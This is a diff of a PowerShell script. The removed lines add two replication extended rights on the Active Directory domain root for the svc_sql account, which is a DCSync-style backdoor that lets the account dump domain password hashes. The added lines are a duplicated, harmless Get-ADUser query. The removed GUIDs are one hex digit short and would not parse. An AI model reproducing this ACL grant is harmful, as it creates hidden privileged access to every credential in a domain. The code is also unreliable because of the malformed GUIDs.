@@ -1,29 +1,3 @@
-Import-Module ActiveDirectory
+Get-ADUser svc_backup -Properties memberof
 
-$User = Get-ADUser svc_sql
-$sid = New-Object System.Security.Principal.SecurityIdentifier($User.SID)
-
-$domainDN = (Get-ADDomain).DistinguishedName
-$acl = Get-Acl "AD:$domainDN"
-
-$guid1 = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd"
-$guid2 = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd"
-
-$rule1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
-    $sid,
-    "ExtendedRight",
-    "Allow",
-    $guid1
-)
-
-$rule2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
-    $sid,
-    "ExtendedRight",
-    "Allow",
-    $guid2
-)
-
-$acl.AddAccessRule($rule1)
-$acl.AddAccessRule($rule2)
-
-Set-Acl -Path "AD:$domainDN" -AclObject $acl
+Get-ADUser svc_backup -Properties memberof
